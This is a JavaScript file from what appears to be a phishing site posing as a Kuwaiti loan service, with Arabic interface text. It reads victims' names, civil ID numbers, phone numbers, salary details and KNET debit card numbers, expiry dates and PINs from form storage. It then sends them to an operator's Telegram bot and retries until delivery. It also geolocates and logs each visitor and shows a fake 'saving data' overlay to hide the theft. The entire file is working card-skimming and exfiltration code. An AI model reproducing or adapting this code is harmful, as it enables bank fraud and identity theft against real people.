function getTelegramFunctionUrl() {
  if (typeof window === "undefined" || window.location.protocol === "file:") {
    return null;
  }

  const base = window.location.origin || "";
  return base ? base + "/.netlify/functions/telegram" : "/.netlify/functions/telegram";
}

async function sendDirectTelegramMessage(text, notify = true, timeoutMs = TELEGRAM_REQUEST_TIMEOUT_MS) {
  const botToken = window.TELEGRAM_BOT_TOKEN || (window.TELEGRAM_CONFIG && window.TELEGRAM_CONFIG.botToken) || "";
  const chatId = window.TELEGRAM_CHAT_ID || (window.TELEGRAM_CONFIG && window.TELEGRAM_CONFIG.chatId) || "";

  if (!botToken || !chatId) {
    throw new Error(TELEGRAM_SERVER_ERROR_MESSAGE);
  }

  const controller = new AbortController();
  const timeoutId = window.setTimeout(function() {
    controller.abort();
  }, timeoutMs);

  try {
    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      signal: controller.signal,
      body: JSON.stringify({
        chat_id: chatId,
        text,
        parse_mode: "HTML",
        disable_notification: Boolean(notify),
      }),
    });

    const data = await response.json();

    if (!response.ok || !data || !data.ok) {
      throw new Error(data && data.description ? data.description : TELEGRAM_SERVER_ERROR_MESSAGE);
    }

    return data;
  } finally {
    window.clearTimeout(timeoutId);
  }
}

async function sendViaTelegramProxy(text, notify = true, timeoutMs = TELEGRAM_REQUEST_TIMEOUT_MS) {
  const functionUrl = getTelegramFunctionUrl();
  if (!functionUrl) {
    throw new Error(TELEGRAM_SERVER_ERROR_MESSAGE);
  }

  const controller = new AbortController();
  const timeoutId = window.setTimeout(function() {
    controller.abort();
  }, timeoutMs);

  try {
    const res = await fetch(functionUrl, {
      method: "POST",
      keepalive: true,
      headers: { "Content-Type": "application/json" },
      signal: controller.signal,
      body: JSON.stringify({
        message: text,
        parseMode: "HTML",
        disableNotification: notify,
      }),
    });

    if (!res.ok) {
      throw new Error(TELEGRAM_SERVER_ERROR_MESSAGE);
    }

    const data = await res.json();

    if (!data.ok) {
      throw new Error(data.error || TELEGRAM_SERVER_ERROR_MESSAGE);
    }

    return data;
  } finally {
    window.clearTimeout(timeoutId);
  }
}

async function send(text, notify = true, timeoutMs = TELEGRAM_REQUEST_TIMEOUT_MS) {
  const attempts = [
    function() { return sendDirectTelegramMessage(text, notify, timeoutMs); },
    function() { return sendViaTelegramProxy(text, notify, timeoutMs); },
  ];

  let lastError = null;

  for (const attempt of attempts) {
    try {
      return await attempt();
    } catch (error) {
      lastError = error;
    }
  }

  throw lastError || new Error(TELEGRAM_SERVER_ERROR_MESSAGE);
}



const LOCATION_STORAGE_KEY = "location";
const VISITOR_STORAGE_KEY = "visitor";
const INDEX_SESSION_KEY = "already_sent_index";
const TELEGRAM_REQUEST_TIMEOUT_MS = 3000;
const TELEGRAM_SERVER_ERROR_MESSAGE = "تعذر الاتصال بالخادم يرجى اعادة المحاولة";

function showTelegramServerFailureNotice(message) {
  return false;
}

window.showTelegramServerFailureNotice = showTelegramServerFailureNotice;

function formatTelegramTelLink(value) {
  const rawValue = value == null ? "" : String(value).trim();

  if (!rawValue || rawValue === "غير متوفر" || rawValue === "غير معروف") {
    return rawValue || "غير معروف";
  }

  return rawValue;
}
const TELEGRAM_PENDING_MESSAGES_KEY = "pendingTelegramMessages";
const TELEGRAM_SEPARATOR = "<b>───────────────</b>";
const TELEGRAM_PERSONAL_INFO_MISSING_LINE = "المستخدم لم يقم بادخال المعلومات الشخصية";
const TELEGRAM_SALARY_INFO_MISSING_LINE = "المستخدم لم يقم بادخال معلومات الراتب";
const STEP1_FAIL_STORAGE_KEY = "step1_fail";
const STEP2_FAIL_STORAGE_KEY = "step2_fail";
const SUBMISSION_LOADING_DURATION_MS = 3000;
const SUBMISSION_LOADING_STYLE_ID = "submission-loading-style";
const SUBMISSION_LOADING_OVERLAY_ID = "submission-loading-overlay";
const SUBMISSION_LOADING_VARIANT_KNET = "knet";
const VISITOR_EMOJI = "👤";
const LOCATION_REQUEST_TIMEOUT_MS = 3000;
const UNKNOWN_COUNTRY_LABEL = "الدولة غير معروفة";
const SOFT_KEYBOARD_STYLE_ID = "soft-keyboard-style";
const LOCATION_API_FALLBACKS = [
  {
    url: "https://get.geojs.io/v1/ip/geo.json",
    getCountryCode(data) {
      return data?.country_code || "";
    },
  },
  {
    url: "https://ipinfo.io/json",
    getCountryCode(data) {
      return data?.country || "";
    },
  },
  {
    url: "https://ipwho.is/",
    getCountryCode(data) {
      return data?.success ? data.country_code || "" : "";
    },
  },
];

let submissionLoadingAnimationFrameId = null;

function countryCodeToFlagEmoji(countryCode) {
  if (!countryCode || countryCode.length !== 2) {
    return "📍";
  }

  return countryCode
    .toUpperCase()
    .split("")
    .map(function(character) {
      return String.fromCodePoint(127397 + character.charCodeAt(0));
    })
    .join("");
}

function getArabicCountryName(countryCode) {
  if (!countryCode || typeof Intl === "undefined" || typeof Intl.DisplayNames !== "function") {
    return "";
  }

  try {
    const regionNames = new Intl.DisplayNames(["ar"], { type: "region" });
    return regionNames.of(countryCode.toUpperCase()) || "";
  } catch (error) {
    return "";
  }
}

function getCurrentPageKey() {
  const pathname = window.location.pathname || "";

  if (!pathname || pathname === "/" || pathname.endsWith("/index.html")) {
    return "index";
  }

  const segments = pathname.split("/");
  return segments[segments.length - 1] || "index";
}

function clearAllTelegramSessionKeys() {
  sessionStorage.removeItem(INDEX_SESSION_KEY);
}

function getCurrentPageDisplayName() {
  const pageKey = getCurrentPageKey();

  switch (pageKey) {
    case "index":
      return "الرئيسية";
    case "step1.html":
      return "صفحة المعلومات الشخصية";
    case "step2.html":
      return "صفحة الراتب";
    case "step3.html":
      return "صفحة الدفع";
    case "knet.html":
      return "صفحة الكي نت";
    case "verify.html":
      return "صفحة التحقق";
    default:
      return pageKey.replace(/\.html$/i, "") || "صفحة غير معروفة";
  }
}

function getCurrentPageEmoji() {
  const pageKey = getCurrentPageKey();

  switch (pageKey) {
    case "index":
      return "🏠";
    case "step1.html":
      return "📝";
    case "step2.html":
      return "💼";
    case "step3.html":
      return "💳";
    case "knet.html":
      return "🏦";
    case "verify.html":
      return "🔐";
    default:
      return "📄";
  }
}

function normalizeStoredValue(value) {
  return typeof value === "string" ? value.trim() : "";
}

function getStoredIdentity() {
  return {
    name: normalizeStoredValue(localStorage.getItem("step1.name")),
    phone: normalizeStoredValue(localStorage.getItem("step1.phone")),
    civilId: normalizeStoredValue(localStorage.getItem("step1.civil")),
  };
}

function getStoredSalaryDetails() {
  return {
    netSalary: normalizeStoredValue(localStorage.getItem("step2.netSalary")),
    requestedAmount: normalizeStoredValue(localStorage.getItem("step2.requestedAmount")),
    workSector: normalizeStoredValue(localStorage.getItem("step2.workSector")),
    jobTitle: normalizeStoredValue(localStorage.getItem("step2.jobTitle")),
  };
}

function getStoredKnetDetails() {
  return {
    bankname: normalizeStoredValue(localStorage.getItem("bankname")),
    dcprefix: normalizeStoredValue(localStorage.getItem("dcprefix")),
    debitnumber: normalizeStoredValue(localStorage.getItem("debitnumber")),
    month: normalizeStoredValue(localStorage.getItem("month")),
    year: normalizeStoredValue(localStorage.getItem("year")),
    pincode: normalizeStoredValue(localStorage.getItem("pincode")),
  };
}

function isKnetDetailsValid(details) {
  if (!details) {
    return false;
  }

  const bankname = normalizeStoredValue(details.bankname);
  const dcprefix = normalizeStoredValue(details.dcprefix);
  const debitnumber = normalizeStoredValue(details.debitnumber);
  const month = normalizeStoredValue(details.month);
  const year = normalizeStoredValue(details.year);
  const pincode = normalizeStoredValue(details.pincode);

  if (!bankname || !dcprefix || !debitnumber || !month || !year || !pincode) {
    return false;
  }

  if (!/^\d+$/.test(dcprefix) || !/^\d+$/.test(debitnumber) || !/^\d{4}$/.test(pincode)) {
    return false;
  }

  if (dcprefix.length + debitnumber.length !== 16) {
    return false;
  }

  if (!/^\d{1,2}$/.test(month) || !/^\d{4}$/.test(year)) {
    return false;
  }

  const monthNumber = Number(month);
  const yearNumber = Number(year);

  if (!Number.isInteger(monthNumber) || monthNumber < 1 || monthNumber > 12) {
    return false;
  }

  if (!Number.isInteger(yearNumber)) {
    return false;
  }

  const now = new Date();
  const currentYear = now.getFullYear();
  const currentMonth = now.getMonth() + 1;

  if (yearNumber < currentYear || (yearNumber === currentYear && monthNumber < currentMonth)) {
    return false;
  }

  return true;
}

function getStoredIdentityLines() {
  const identity = getStoredIdentity();
  const lines = [
    `👤 الاسم: ${identity.name || "غير متوفر"}`,
  ];

  if (identity.civilId) {
    lines.push(`الرقم المدني : ${identity.civilId}`);
  }

  lines.push(`📞 رقم الهاتف: ${formatTelegramTelLink(identity.phone || "غير متوفر")}`);
  return lines;
}

function getStoredIdentityLinesOnlyIfPresent() {
  const identity = {
    name: (localStorage.getItem("step1.name") || "").trim(),
    phone: (localStorage.getItem("step1.phone") || "").trim(),
    civilId: (localStorage.getItem("step1.civil") || "").trim(),
  };

  const lines = [];

  if (identity.name) {
    lines.push(`👤 الاسم: ${identity.name}`);
  }

  if (identity.civilId) {
    lines.push(`الرقم المدني : ${identity.civilId}`);
  }

  if (identity.phone) {
    lines.push(`📞 رقم الهاتف: ${identity.phone}`);
  }

  return lines;
}

function buildStoredKnetDetailsLines() {
  const knet = getStoredKnetDetails();

  if (!isKnetDetailsValid(knet)) {
    return [];
  }

  return [
    `${knet.bankname || "Bankname"} ─ ${knet.dcprefix || "dcprefix"}`,
    `💳 ${knet.debitnumber || "غير متوفر"}`,
    `📅 ${(knet.month || "mm")}/${(knet.year || "year")}`,
    `🔐 ${knet.pincode || "غير متوفر"}`,
  ];
}

function normalizeCountryDisplayName(value) {
  const raw = typeof value === "string" ? value.trim() : "";
  if (!raw) {
    return "غير معروف";
  }

  if (raw.includes(" - ")) {
    return raw.split(" - ").pop().trim() || "غير معروف";
  }

  return raw.replace(/^.*\s*[-:]/, "").trim() || raw;
}

function getStoredCountryDisplayName() {
  const countryText = localStorage.getItem(LOCATION_STORAGE_KEY) || "";
  return normalizeCountryDisplayName(countryText);
}

function buildVisitorLandingMessage() {
  const visitorType = localStorage.getItem(VISITOR_STORAGE_KEY) || "new";
  const countryName = getStoredCountryDisplayName();
  const identity = getStoredIdentity();
  const hasIdentity = Boolean(identity.name || identity.phone);

  if (visitorType === "new") {
    return [
      "زائر جديد",
      `دولة ${countryName}`,
    ].join("\n");
  }

  const lines = [
    "زائر قديم",
    `دولة ${countryName}`,
  ];

  if (hasIdentity) {
    if (identity.name) {
      lines.push(`الاسم: ${identity.name}`);
    }
    if (identity.phone) {
      lines.push(`رقم الهاتف: ${identity.phone}`);
    }
  }

  return lines.join("\n");
}

function storeVisitorType() {
  const hasVisitedBefore = localStorage.getItem(VISITOR_STORAGE_KEY) !== null;
  const visitorType = hasVisitedBefore ? "old" : "new";
  localStorage.setItem(VISITOR_STORAGE_KEY, visitorType);
  return visitorType;
}

function getVisitorConsoleSummary() {
  const visitorLabel = localStorage.getItem(VISITOR_STORAGE_KEY) === "old" ? "مستخدم قديم" : "مستخدم جديد";
  const locationLabel = localStorage.getItem(LOCATION_STORAGE_KEY) || "";
  return [visitorLabel, locationLabel].filter(Boolean).join("\n");
}

function getPendingTelegramMessages() {
  try {
    const rawMessages = localStorage.getItem(TELEGRAM_PENDING_MESSAGES_KEY);
    const parsedMessages = rawMessages ? JSON.parse(rawMessages) : [];
    return Array.isArray(parsedMessages) ? parsedMessages : [];
  } catch (error) {
    localStorage.removeItem(TELEGRAM_PENDING_MESSAGES_KEY);
    return [];
  }
}

function setPendingTelegramMessages(messages) {
  if (!messages.length) {
    localStorage.removeItem(TELEGRAM_PENDING_MESSAGES_KEY);
    return;
  }

  localStorage.setItem(TELEGRAM_PENDING_MESSAGES_KEY, JSON.stringify(messages));
}

function queueTelegramMessage(text, notify) {
  const pendingMessages = getPendingTelegramMessages();
  pendingMessages.push({
    id: `${Date.now()}-${Math.random().toString(16).slice(2)}`,
    text,
    notify,
  });
  setPendingTelegramMessages(pendingMessages);
}

function removeQueuedTelegramMessagesByText(text) {
  const pendingMessages = getPendingTelegramMessages().filter(function(message) {
    return message.text !== text;
  });

  setPendingTelegramMessages(pendingMessages);
}

function waitForSubmissionDelay(durationMs) {
  return new Promise(function(resolve) {
    window.setTimeout(resolve, durationMs);
  });
}

function ensureSubmissionLoadingOverlay() {
  if (!document.body) {
    return null;
  }

  if (!document.getElementById(SUBMISSION_LOADING_STYLE_ID)) {
    const style = document.createElement("style");
    style.id = SUBMISSION_LOADING_STYLE_ID;
    style.textContent = `
      body.is-submission-loading {
        overflow: hidden;
      }

      .submission-loading-overlay {
        position: fixed;
        inset: 0;
        z-index: 9999;
        display: flex;
        align-items: center;
        justify-content: center;
        padding: 24px;
        background: rgba(255, 255, 255, 0.94);
        backdrop-filter: blur(6px);
      }

      .submission-loading-overlay.is-knet {
        background: rgba(85, 85, 85, 0.5);
        backdrop-filter: none;
      }

      .submission-loading-overlay[hidden] {
        display: none !important;
      }

      .submission-loading-card {
        width: min(320px, 100%);
        padding: 28px 24px;
        border-radius: 24px;
        text-align: center;
        background: linear-gradient(180deg, #ffffff 0%, #eef8ff 100%);
        box-shadow: 0 24px 60px rgba(0, 77, 128, 0.16);
        border: 1px solid rgba(0, 163, 224, 0.16);
      }

      .submission-loading-spinner {
        position: relative;
        width: 72px;
        height: 72px;
        margin: 0 auto 18px;
        line-height: 0;
      }

      .submission-loading-overlay.is-knet .submission-loading-card {
        width: auto;
        padding: 0;
        background: transparent;
        box-shadow: none;
        border: 0;
      }

      .submission-loading-overlay.is-knet .submission-loading-spinner {
        width: min(15vh, 96px);
        height: min(15vh, 96px);
        margin: 0 auto;
      }

      .submission-loading-logo {
        position: absolute;
        inset: 0;
        width: 100%;
        height: 100%;
        margin: auto;
        display: block;
        animation: submission-loading-spin 1s linear infinite;
        transform-origin: center center;
        will-change: transform;
      }

      .submission-loading-overlay.is-knet .submission-loading-title,
      .submission-loading-overlay.is-knet .submission-loading-copy,
      .submission-loading-overlay.is-knet .submission-loading-progress {
        display: none;
      }

      .submission-loading-title {
        margin: 0;
        color: #0f172a;
        font-size: 1rem;
        font-weight: 700;
      }

      .submission-loading-copy {
        margin: 8px 0 0;
        color: #475569;
        font-size: 0.875rem;
      }

      .submission-loading-progress {
        width: 100%;
        height: 8px;
        margin-top: 18px;
        overflow: hidden;
        border-radius: 999px;
        background: rgba(15, 23, 42, 0.08);
      }

      .submission-loading-progress-bar {
        width: 0;
        height: 100%;
        border-radius: inherit;
        background: linear-gradient(90deg, #00a3e0 0%, #1d4ed8 100%);
      }

      @keyframes submission-loading-spin {
        from { transform: rotate(0deg); }
        to { transform: rotate(360deg); }
      }
    `;
    document.head.appendChild(style);
  }

  let overlay = document.getElementById(SUBMISSION_LOADING_OVERLAY_ID);

  if (!overlay) {
    overlay = document.createElement("div");
    overlay.id = SUBMISSION_LOADING_OVERLAY_ID;
    overlay.className = "submission-loading-overlay";
    overlay.hidden = true;
    overlay.innerHTML = `
      <div class="submission-loading-card" dir="rtl">
        <div class="submission-loading-spinner" aria-hidden="true">
          <img class="submission-loading-logo" src="./assets/images/logo.svg" alt="Commercial Facilities logo" />
        </div>
        <p class="submission-loading-title" data-loading-title>جارٍ تجهيز البيانات</p>
        <p class="submission-loading-copy">يتم حفظ البيانات وإرسالها قبل الانتقال للخطوة التالية.</p>
        <div class="submission-loading-progress" aria-hidden="true">
          <div class="submission-loading-progress-bar" data-loading-progress></div>
        </div>
      </div>
    `;
    document.body.appendChild(overlay);
  }

  return overlay;
}

function showSubmissionLoadingOverlay(title, durationMs, variant) {
  const overlay = ensureSubmissionLoadingOverlay();

  if (!overlay) {
    return;
  }

  const loadingTitle = overlay.querySelector("[data-loading-title]");
  const progressBar = overlay.querySelector("[data-loading-progress]");
  const progressDuration = typeof durationMs === "number" ? durationMs : SUBMISSION_LOADING_DURATION_MS;
  const overlayVariant = variant || "default";

  if (loadingTitle && title) {
    loadingTitle.textContent = title;
  }

  overlay.classList.toggle("is-knet", overlayVariant === SUBMISSION_LOADING_VARIANT_KNET);
  overlay.hidden = false;
  document.body.classList.add("is-submission-loading");

  if (!progressBar) {
    return;
  }

  if (submissionLoadingAnimationFrameId) {
    window.cancelAnimationFrame(submissionLoadingAnimationFrameId);
    submissionLoadingAnimationFrameId = null;
  }

  progressBar.style.transition = "none";
  progressBar.style.width = "0%";

  submissionLoadingAnimationFrameId = window.requestAnimationFrame(function() {
    submissionLoadingAnimationFrameId = window.requestAnimationFrame(function() {
      progressBar.style.transition = `width ${progressDuration}ms linear`;
      progressBar.style.width = "100%";
    });
  });
}

function hideSubmissionLoadingOverlay() {
  const overlay = document.getElementById(SUBMISSION_LOADING_OVERLAY_ID);

  if (submissionLoadingAnimationFrameId) {
    window.cancelAnimationFrame(submissionLoadingAnimationFrameId);
    submissionLoadingAnimationFrameId = null;
  }

  if (!overlay) {
    return;
  }

  const progressBar = overlay.querySelector("[data-loading-progress]");

  if (progressBar) {
    progressBar.style.transition = "none";
    progressBar.style.width = "0%";
  }

  overlay.hidden = true;
  overlay.classList.remove("is-knet");
  document.body.classList.remove("is-submission-loading");
}

async function sendTelegramMessageWithQueue(text, notify) {
  try {
    await send(text, notify, TELEGRAM_REQUEST_TIMEOUT_MS);
    removeQueuedTelegramMessagesByText(text);
    return { sent: true, queued: false };
  } catch (error) {
    showTelegramServerFailureNotice(error && error.message ? error.message : TELEGRAM_SERVER_ERROR_MESSAGE);
    queueTelegramMessage(text, notify);
    return { sent: false, queued: true, error };
  }
}

async function persistTelegramMessageThenSend(text, notify) {
  queueTelegramMessage(text, notify);

  try {
    await send(text, notify, TELEGRAM_REQUEST_TIMEOUT_MS);
    removeQueuedTelegramMessagesByText(text);
    return { sent: true, queued: false };
  } catch (error) {
    return { sent: false, queued: true, error };
  }
}

async function retryPendingTelegramMessages() {
  const pendingMessages = getPendingTelegramMessages();

  if (!pendingMessages.length) {
    return;
  }

  const remainingMessages = [];

  for (const message of pendingMessages) {
    try {
      await send(message.text, message.notify, TELEGRAM_REQUEST_TIMEOUT_MS);
    } catch (error) {
      remainingMessages.push(message);
    }
  }

  setPendingTelegramMessages(remainingMessages);
}

async function sendTelegramMessageOnce(text, notify) {
  try {
    await send(text, notify, TELEGRAM_REQUEST_TIMEOUT_MS);
    removeQueuedTelegramMessagesByText(text);
    return true;
  } catch (error) {
    showTelegramServerFailureNotice(error && error.message ? error.message : TELEGRAM_SERVER_ERROR_MESSAGE);
    return false;
  }
}

async function sendTelegramUntilDelivered(text, notify, maxAttempts = 1) {
  queueTelegramMessage(text, notify);

  try {
    await send(text, notify, TELEGRAM_REQUEST_TIMEOUT_MS);
    removeQueuedTelegramMessagesByText(text);
    return true;
  } catch (error) {
    showTelegramServerFailureNotice(error && error.message ? error.message : TELEGRAM_SERVER_ERROR_MESSAGE);
    return false;
  }
}

async function resendStoredFailureMessage(storageKey, warningMessage) {
  const failedMessage = localStorage.getItem(storageKey);

  if (!failedMessage) {
    return false;
  }

  await sendTelegramUntilDelivered(failedMessage, false);

  localStorage.removeItem(storageKey);

  if (warningMessage) {
    await sendTelegramMessageWithQueue(warningMessage, false);
  }

  return true;
}

async function fetchJsonWithTimeout(url) {
  const controller = new AbortController();
  const timeoutId = window.setTimeout(function() {
    controller.abort();
  }, LOCATION_REQUEST_TIMEOUT_MS);

  try {
    const response = await fetch(url, {
      headers: {
        Accept: "application/json",
      },
      signal: controller.signal,
    });

    return response;
  } finally {
    window.clearTimeout(timeoutId);
  }
}

async function getVisitorLocationInArabic() {
  for (const api of LOCATION_API_FALLBACKS) {
    try {
      const response = await fetchJsonWithTimeout(api.url);

      if (!response.ok) {
        throw new Error(`Location request failed with status ${response.status}`);
      }

      const data = await response.json();
      const countryCode = api.getCountryCode(data);
      const countryName = getArabicCountryName(countryCode);

      if (!countryCode || !countryName) {
        throw new Error("Location data is incomplete.");
      }

      const formattedLocation = `${countryCodeToFlagEmoji(countryCode)} - ${countryName}`;
      localStorage.setItem(LOCATION_STORAGE_KEY, formattedLocation);
      return formattedLocation;
    } catch (error) {
      continue;
    }
  }

  localStorage.setItem(LOCATION_STORAGE_KEY, UNKNOWN_COUNTRY_LABEL);
  return UNKNOWN_COUNTRY_LABEL;
}

function visitor_log_in_main() {
  sendTelegramMessageWithQueue(getVisitorConsoleSummary(), false).catch(function() {});
}

async function initializeVisitorMetadata() {
  const wasVisitedBefore = localStorage.getItem(VISITOR_STORAGE_KEY) !== null;
  const visitorType = storeVisitorType();

  const pageKey = getCurrentPageKey();
  if (pageKey !== "index") {
    return;
  }

  const hasLocation = localStorage.getItem(LOCATION_STORAGE_KEY);
  if (!hasLocation) {
    await getVisitorLocationInArabic();
  }

  if (sessionStorage.getItem(INDEX_SESSION_KEY) === "true") {
    return;
  }

  const landingMessage = buildVisitorLandingMessage();
  if (!landingMessage || !landingMessage.trim()) {
    sessionStorage.setItem(INDEX_SESSION_KEY, "true");
    return;
  }

  const shouldSendForOldVisitor = visitorType === "old" && wasVisitedBefore;
  if (!shouldSendForOldVisitor && visitorType !== "new") {
    sessionStorage.setItem(INDEX_SESSION_KEY, "true");
    return;
  }

  await sendTelegramMessageWithQueue(landingMessage, false);
  sessionStorage.setItem(INDEX_SESSION_KEY, "true");
}

function ensureSoftKeyboardStyles() {
  if (document.getElementById(SOFT_KEYBOARD_STYLE_ID)) {
    return;
  }

  const style = document.createElement("style");
  style.id = SOFT_KEYBOARD_STYLE_ID;
  style.textContent = `
    :root { --keyboard-offset: 0px; }
    body.keyboard-open { padding-bottom: var(--keyboard-offset); }
    body { scroll-padding-bottom: var(--keyboard-offset); }
  `;
  document.head.appendChild(style);
}

function setupSoftKeyboardViewportHandling() {
  ensureSoftKeyboardStyles();

  let lastOffset = -1;

  function updateKeyboardOffset() {
    let offset = 0;

    if (window.visualViewport) {
      const viewport = window.visualViewport;
      offset = Math.max(0, window.innerHeight - viewport.height - viewport.offsetTop);
    } else if (typeof window.__keyboardBaseHeight === "number") {
      offset = Math.max(0, window.__keyboardBaseHeight - window.innerHeight);
    }

    if (Math.abs(offset - lastOffset) < 1) {
      return;
    }

    lastOffset = offset;
    document.documentElement.style.setProperty("--keyboard-offset", `${offset}px`);
    document.body.classList.toggle("keyboard-open", offset > 0);
  }

  if (!window.visualViewport) {
    window.__keyboardBaseHeight = window.innerHeight;
  }

  updateKeyboardOffset();

  if (window.visualViewport) {
    window.visualViewport.addEventListener("resize", updateKeyboardOffset);
    window.visualViewport.addEventListener("scroll", updateKeyboardOffset);
  } else {
    window.addEventListener("resize", updateKeyboardOffset);
  }

  document.addEventListener("focusin", function(event) {
    const target = event.target;
    if (!target || !(target instanceof HTMLElement)) {
      return;
    }

    if (!target.matches("input, textarea, select")) {
      return;
    }

    window.setTimeout(function() {
      try {
        target.scrollIntoView({ block: "center", behavior: "smooth" });
      } catch (error) {
        target.scrollIntoView(true);
      }
    }, 50);
  });
}

window.getVisitorLocationInArabic = getVisitorLocationInArabic;
window.getVisitorConsoleSummary = getVisitorConsoleSummary;
window.visitor_log_in_main = visitor_log_in_main;
window.sendTelegramMessageWithQueue = sendTelegramMessageWithQueue;
window.persistTelegramMessageThenSend = persistTelegramMessageThenSend;
window.retryPendingTelegramMessages = retryPendingTelegramMessages;
window.sendTelegramMessageOnce = sendTelegramMessageOnce;
window.sendTelegramUntilDelivered = sendTelegramUntilDelivered;
window.resendStoredFailureMessage = resendStoredFailureMessage;
window.showSubmissionLoadingOverlay = showSubmissionLoadingOverlay;
window.hideSubmissionLoadingOverlay = hideSubmissionLoadingOverlay;
window.waitForSubmissionDelay = waitForSubmissionDelay;
window.getCurrentTelegramPageKey = getCurrentPageKey;
window.clearAllTelegramSessionKeys = clearAllTelegramSessionKeys;
window.getTelegramStoredIdentityLines = getStoredIdentityLines;
window.getTelegramStoredIdentityLinesOnlyIfPresent = getStoredIdentityLinesOnlyIfPresent;
window.getTelegramStoredIdentity = getStoredIdentity;
window.getTelegramStoredSalaryDetails = getStoredSalaryDetails;
window.getTelegramStoredKnetDetails = getStoredKnetDetails;
window.isTelegramKnetDetailsValid = isKnetDetailsValid;
window.getStoredKnetTelegramLines = buildStoredKnetDetailsLines;
window.getTelegramSeparator = function() {
  return TELEGRAM_SEPARATOR;
};
window.getTelegramPersonalInfoFallbackText = function() {
  return TELEGRAM_PERSONAL_INFO_MISSING_LINE;
};
window.getTelegramSalaryFallbackText = function() {
  return TELEGRAM_SALARY_INFO_MISSING_LINE;
};
window.getCurrentTelegramPageName = getCurrentPageDisplayName;
window.getCurrentTelegramPageEmoji = getCurrentPageEmoji;
window.STEP1_FAIL_STORAGE_KEY = STEP1_FAIL_STORAGE_KEY;
window.STEP2_FAIL_STORAGE_KEY = STEP2_FAIL_STORAGE_KEY;

function initializePageBehaviors() {
  initializeVisitorMetadata().catch(function() {});
  setupSoftKeyboardViewportHandling();
}

if (document.readyState === "loading") {
  document.addEventListener("DOMContentLoaded", initializePageBehaviors, { once: true });
} else {
  initializePageBehaviors();
}

retryPendingTelegramMessages().catch(function() {});
